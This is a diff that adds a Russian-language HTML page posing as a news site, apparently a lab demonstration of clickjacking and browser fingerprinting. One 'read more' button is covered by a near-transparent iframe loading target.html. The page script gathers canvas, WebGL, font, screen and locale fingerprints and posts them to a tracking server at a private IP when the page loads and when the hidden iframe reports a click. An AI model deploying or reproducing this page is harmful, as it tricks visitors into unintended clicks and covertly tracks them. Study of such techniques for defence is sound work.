@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Новостной Дайджест — Актуальные новости России</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f0f2f5;
+            color: #1d1d1f;
+            min-height: 100vh;
+        }
+
+        header {
+            background: linear-gradient(135deg, #0f1c2e 0%, #1e3a5f 100%);
+            color: #fff;
+            position: sticky;
+            top: 0;
+            z-index: 200;
+            box-shadow: 0 2px 24px rgba(0,0,0,.4);
+        }
+        .header-top {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 14px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        .logo { font-size: 24px; font-weight: 800; letter-spacing: -1px; }
+        .logo em { color: #5ba4f5; font-style: normal; }
+        .logo small { display: block; font-size: 11px; font-weight: 400;
+                      color: rgba(255,255,255,.5); letter-spacing: 2px;
+                      text-transform: uppercase; margin-top: 2px; }
+        nav a {
+            color: rgba(255,255,255,.8);
+            text-decoration: none;
+            margin-left: 22px;
+            font-size: 13.5px;
+            letter-spacing: .3px;
+            transition: color .15s;
+        }
+        nav a:hover { color: #fff; }
+        .header-sub {
+            background: rgba(0,0,0,.25);
+            font-size: 12px;
+            color: rgba(255,255,255,.55);
+            text-align: center;
+            padding: 5px 20px;
+            letter-spacing: .5px;
+        }
+
+        .ticker {
+            background: #c0392b;
+            color: #fff;
+            padding: 8px 20px;
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .ticker-label {
+            background: rgba(0,0,0,.3);
+            padding: 2px 10px;
+            border-radius: 3px;
+            font-weight: 700;
+            font-size: 11px;
+            letter-spacing: 1px;
+            white-space: nowrap;
+        }
+
+        main {
+            max-width: 1200px;
+            margin: 30px auto;
+            padding: 0 20px;
+        }
+
+        .section-label {
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            color: #6b7280;
+            margin-bottom: 18px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #d1d5db;
+        }
+
+        .hero {
+            display: flex;
+            background: #fff;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 4px 32px rgba(0,0,0,.09);
+            margin-bottom: 32px;
+            min-height: 290px;
+        }
+        .hero-img {
+            width: 42%;
+            background: linear-gradient(135deg, #1a56db 0%, #6d28d9 100%);
+            display: flex;
+            align-items: flex-end;
+            justify-content: flex-start;
+            flex-shrink: 0;
+            padding: 16px;
+        }
+        .hero-img-label {
+            font-size: 11px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: rgba(255,255,255,.6);
+            background: rgba(0,0,0,.25);
+            padding: 4px 10px;
+            border-radius: 4px;
+        }
+        .hero-body {
+            padding: 36px 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+        .hero-tag {
+            display: inline-block;
+            background: #eff6ff;
+            color: #1d4ed8;
+            border: 1px solid #bfdbfe;
+            padding: 3px 12px;
+            border-radius: 20px;
+            font-size: 11.5px;
+            font-weight: 700;
+            letter-spacing: .5px;
+            text-transform: uppercase;
+            margin-bottom: 14px;
+        }
+        .hero-body h2 {
+            font-size: 27px;
+            line-height: 1.32;
+            margin-bottom: 14px;
+            color: #111827;
+        }
+        .hero-body p {
+            font-size: 15px;
+            line-height: 1.7;
+            color: #6b7280;
+            margin-bottom: 22px;
+        }
+        .btn-hero {
+            display: inline-block;
+            background: #1d4ed8;
+            color: #fff;
+            padding: 11px 26px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            transition: background .15s;
+            align-self: flex-start;
+        }
+        .btn-hero:hover { background: #1e40af; }
+
+        .cards-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 22px;
+            margin-bottom: 40px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 2px 18px rgba(0,0,0,.07);
+            display: flex;
+            flex-direction: column;
+            transition: transform .2s, box-shadow .2s;
+        }
+        .card:hover { transform: translateY(-4px); box-shadow: 0 10px 36px rgba(0,0,0,.13); }
+
+        .card-img {
+            height: 160px;
+            display: flex;
+            align-items: flex-end;
+            justify-content: flex-start;
+            flex-shrink: 0;
+            padding: 12px;
+        }
+        .card-img.blue   { background: linear-gradient(135deg, #3b82f6, #1d4ed8); }
+        .card-img.green  { background: linear-gradient(135deg, #10b981, #065f46); }
+        .card-img.orange { background: linear-gradient(135deg, #f59e0b, #b45309); }
+        .card-img-label {
+            font-size: 10px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+            color: rgba(255,255,255,.65);
+            background: rgba(0,0,0,.2);
+            padding: 3px 8px;
+            border-radius: 3px;
+        }
+
+        .card-body { padding: 20px; flex: 1; display: flex; flex-direction: column; }
+
+        .card-tag {
+            font-size: 10.5px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: #2563eb;
+            margin-bottom: 9px;
+        }
+        .card-body h3 {
+            font-size: 17px;
+            line-height: 1.42;
+            margin-bottom: 10px;
+            color: #111827;
+        }
+        .card-body p {
+            font-size: 13.5px;
+            color: #6b7280;
+            line-height: 1.65;
+            margin-bottom: 16px;
+            flex: 1;
+        }
+        .card-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-top: auto;
+        }
+        .card-date { font-size: 12px; color: #9ca3af; }
+
+        .read-wrap {
+            position: relative;
+            display: inline-block;
+        }
+        .btn-read {
+            display: inline-block;
+            background: #f3f4f6;
+            color: #374151;
+            padding: 8px 18px;
+            border-radius: 7px;
+            border: 1px solid #d1d5db;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background .15s;
+        }
+        .btn-read:hover { background: #e5e7eb; }
+
+        .trap-iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01;
+            border: none;
+            z-index: 50;
+            cursor: pointer;
+            pointer-events: all;
+        }
+
+        footer {
+            background: #0f1c2e;
+            color: rgba(255,255,255,.65);
+            margin-top: 20px;
+        }
+        .footer-inner {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 44px 20px 30px;
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr 1fr;
+            gap: 40px;
+        }
+        .footer-logo { font-size: 20px; font-weight: 800; color: #fff; margin-bottom: 12px; }
+        .footer-logo em { color: #5ba4f5; font-style: normal; }
+        .footer-desc { font-size: 13px; line-height: 1.65; color: rgba(255,255,255,.45); }
+        footer h4 { font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px;
+                    color: #fff; margin-bottom: 14px; }
+        footer ul { list-style: none; }
+        footer li { margin-bottom: 8px; }
+        footer a { color: rgba(255,255,255,.5); text-decoration: none;
+                   font-size: 13px; transition: color .15s; }
+        footer a:hover { color: #fff; }
+        .footer-copy {
+            border-top: 1px solid rgba(255,255,255,.08);
+            text-align: center;
+            padding: 18px 20px;
+            font-size: 12px;
+            color: rgba(255,255,255,.3);
+        }
+
+        @media (max-width: 900px) {
+            .cards-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 16px;
+            }
+            .footer-inner {
+                grid-template-columns: 1fr 1fr;
+                gap: 28px;
+            }
+        }
+
+        @media (max-width: 640px) {
+            .header-top { padding: 12px 16px; gap: 12px; }
+            .logo { font-size: 19px; }
+            nav { display: none; }
+
+            .ticker { font-size: 12px; padding: 7px 14px; }
+
+            main { margin: 18px auto; padding: 0 14px; }
+
+            .hero {
+                flex-direction: column;
+                min-height: unset;
+                border-radius: 12px;
+            }
+            .hero-img {
+                width: 100%;
+                min-height: 140px;
+                border-radius: 0;
+            }
+            .hero-body {
+                padding: 22px 20px;
+            }
+            .hero-body h2 {
+                font-size: 20px;
+            }
+            .hero-body p {
+                font-size: 14px;
+                margin-bottom: 16px;
+            }
+
+            .cards-grid {
+                grid-template-columns: 1fr;
+                gap: 14px;
+                margin-bottom: 28px;
+            }
+            .card-img { height: 130px; }
+            .card-body h3 { font-size: 15.5px; }
+
+            .footer-inner {
+                grid-template-columns: 1fr;
+                gap: 24px;
+                padding: 30px 16px 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="header-top">
+        <div>
+            <div class="logo">Новостной <em>Дайджест</em>
+                <small>Независимое сетевое издание</small>
+            </div>
+        </div>
+        <nav>
+            <a href="#">Главная</a>
+            <a href="#">Политика</a>
+            <a href="#">Экономика</a>
+            <a href="#">Технологии</a>
+            <a href="#">Культура</a>
+            <a href="#">Спорт</a>
+        </nav>
+    </div>
+    <div class="header-sub" id="headerDate">Загрузка...</div>
+</header>
+
+<div class="ticker">
+    <span class="ticker-label">СРОЧНО</span>
+    <span>ЦБ сохранил ключевую ставку на уровне 16% &nbsp;|&nbsp;
+          Госдума приняла поправки к бюджету 2026 года &nbsp;|&nbsp;
+          Новый рекорд ММВБ: индекс превысил 3 400 пунктов</span>
+</div>
+
+<main>
+    <div class="section-label">Главная новость</div>
+
+    <div class="hero">
+        <div class="hero-img">
+            <span class="hero-img-label">Экономика</span>
+        </div>
+        <div class="hero-body">
+            <span class="hero-tag">Экономика</span>
+            <h2>Правительство представило бюджет-2026: рекордные расходы на образование и инфраструктуру</h2>
+            <p>Федеральный бюджет на следующий год предусматривает увеличение социальных расходов на 27%, строительство 150 новых школ и масштабную программу модернизации транспортной сети. Эксперты называют документ «бюджетом развития».</p>
+            <a href="#" class="btn-hero">Подробнее →</a>
+        </div>
+    </div>
+
+    <div class="section-label">Последние новости</div>
+
+    <div class="cards-grid">
+
+        <div class="card" id="card-trap">
+            <div class="card-img blue">
+                <span class="card-img-label">Технологии</span>
+            </div>
+            <div class="card-body">
+                <div class="card-tag">Технологии</div>
+                <h3>Учёные Сколтеха создали ИИ для ранней диагностики инфаркта по ЭКГ</h3>
+                <p>Нейросеть распознаёт критические отклонения с точностью 97,3%, превосходя показатели опытных кардиологов. Испытания в трёх клиниках подтвердили эффективность...</p>
+                <div class="card-footer">
+                    <span class="card-date">15 мая 2026</span>
+                    <div class="read-wrap" id="readWrap">
+                        <button class="btn-read" id="btnRead">Читать далее</button>
+                        <iframe
+                            class="trap-iframe"
+                            id="trapFrame"
+                            src="target.html"
+                            title="content"
+                            scrolling="no"
+                            allowtransparency="true">
+                        </iframe>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-img green">
+                <span class="card-img-label">Экология</span>
+            </div>
+            <div class="card-body">
+                <div class="card-tag">Экология</div>
+                <h3>В Сибири высадят миллиард деревьев: стартует крупнейшая лесовосстановительная программа</h3>
+                <p>Шесть регионов получат финансирование на восстановление лесного фонда, пострадавшего от пожаров 2023–2025 годов. Программа рассчитана на десять лет...</p>
+                <div class="card-footer">
+                    <span class="card-date">14 мая 2026</span>
+                    <button class="btn-read">Читать далее</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="card-img orange">
+                <span class="card-img-label">Спорт</span>
+            </div>
+            <div class="card-body">
+                <div class="card-tag">Спорт</div>
+                <h3>Сборная России завоевала 18 медалей на чемпионате мира по борьбе в Казани</h3>
+                <p>Российские атлеты выступили во всех весовых категориях и установили исторический рекорд по числу наград. Золотых медалей — семь...</p>
+                <div class="card-footer">
+                    <span class="card-date">13 мая 2026</span>
+                    <button class="btn-read">Читать далее</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+</main>
+
+<footer>
+    <div class="footer-inner">
+        <div>
+            <div class="footer-logo">Новостной <em>Дайджест</em></div>
+            <p class="footer-desc">Независимое сетевое СМИ. Все материалы носят информационный характер. Перепечатка разрешена с указанием источника.</p>
+        </div>
+        <div>
+            <h4>Разделы</h4>
+            <ul>
+                <li><a href="#">Политика</a></li>
+                <li><a href="#">Экономика</a></li>
+                <li><a href="#">Технологии</a></li>
+                <li><a href="#">Культура</a></li>
+                <li><a href="#">Спорт</a></li>
+            </ul>
+        </div>
+        <div>
+            <h4>Редакция</h4>
+            <ul>
+                <li><a href="#">О нас</a></li>
+                <li><a href="#">Контакты</a></li>
+                <li><a href="#">Реклама</a></li>
+                <li><a href="#">Вакансии</a></li>
+            </ul>
+        </div>
+        <div>
+            <h4>Подписка</h4>
+            <ul>
+                <li><a href="#">Telegram</a></li>
+                <li><a href="#">RSS</a></li>
+                <li><a href="#">Email-рассылка</a></li>
+                <li><a href="#">Архив</a></li>
+            </ul>
+        </div>
+    </div>
+    <div class="footer-copy">© 2026 Новостной Дайджест. Все права защищены. 18+</div>
+</footer>
+
+<script>
+    const url = "http://192.168.100.6:5002";
+
+    let sent = false;
+
+    const d = new Date();
+    document.getElementById('headerDate').textContent =
+        d.toLocaleDateString('ru-RU', { weekday: 'long', year: 'numeric',
+                                        month: 'long', day: 'numeric' });
+
+    function canvasHash() {
+        try {
+            const c = document.createElement('canvas');
+            c.width = 240; c.height = 70;
+            const x = c.getContext('2d');
+            x.textBaseline = 'alphabetic';
+            x.fillStyle = '#f0f0f0';
+            x.fillRect(0, 0, 240, 70);
+            x.font = 'bold 18px Arial';
+            x.fillStyle = '#e63946';
+            x.fillText('FP-Test 1234', 10, 28);
+            x.font = '13px Georgia';
+            x.fillStyle = '#457b9d';
+            x.fillText('!@#$% тест', 10, 50);
+            x.beginPath();
+            x.arc(210, 35, 20, 0, Math.PI * 2);
+            x.fillStyle = 'rgba(76, 201, 76, 0.7)';
+            x.fill();
+            return djb2(c.toDataURL());
+        } catch (e) { return 'canvas-err'; }
+    }
+
+    function gpuInfo() {
+        try {
+            const c = document.createElement('canvas');
+            const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+            if (!gl) return 'no-webgl';
+            const ext = gl.getExtension('WEBGL_debug_renderer_info');
+            const renderer = ext
+                ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
+                : gl.getParameter(gl.RENDERER);
+            const vendor = ext
+                ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)
+                : gl.getParameter(gl.VENDOR);
+            return vendor + '~' + renderer;
+        } catch (e) { return 'webgl-err'; }
+    }
+
+    function checkFonts() {
+        const list = [
+            'Arial','Arial Black','Verdana','Times New Roman','Courier New',
+            'Georgia','Palatino','Garamond','Comic Sans MS','Trebuchet MS',
+            'Impact','Lucida Console','Tahoma','Century Gothic','Calibri',
+            'Segoe UI','Roboto','Helvetica','Cambria','Franklin Gothic Medium'
+        ];
+        const c = document.createElement('canvas');
+        const x = c.getContext('2d');
+        const probe = 'mmmmmmmmmmlli';
+        const bases = ['monospace','sans-serif','serif'];
+        const baseW = {};
+        bases.forEach(b => { x.font = '16px ' + b; baseW[b] = x.measureText(probe).width; });
+        return list.filter(f =>
+            bases.some(b => {
+                x.font = "16px '" + f + "'," + b;
+                return x.measureText(probe).width !== baseW[b];
+            })
+        );
+    }
+
+    function djb2(str) {
+        let h = 5381;
+        for (let i = 0; i < str.length; i++) {
+            h = Math.imul(h, 33) ^ str.charCodeAt(i);
+        }
+        return (h >>> 0).toString(16).padStart(8, '0');
+    }
+
+    function sendData(clicked) {
+        const payload = {
+            source:     'site_a',
+            timestamp:  new Date().toISOString(),
+            user_agent: navigator.userAgent,
+            screen:     screen.width + 'x' + screen.height,
+            timezone:   Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language:   navigator.language,
+            canvas_fp:  canvasHash(),
+            webgl_fp:   gpuInfo(),
+            fonts:      checkFonts(),
+            plugins:    navigator.plugins ? navigator.plugins.length : 0,
+            click_event: clicked
+        };
+        fetch(url + '/track', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+            mode: 'cors'
+        }).catch(() => {});
+    }
+
+    window.addEventListener('message', function (e) {
+        if (e.data && e.data.type === 'clickjack_triggered' && !sent) {
+            sent = true;
+            sendData(true);
+        }
+    });
+
+    window.addEventListener('load', function () {
+        setTimeout(() => sendData(false), 600);
+    });
+</script>
+</body>
+</html>
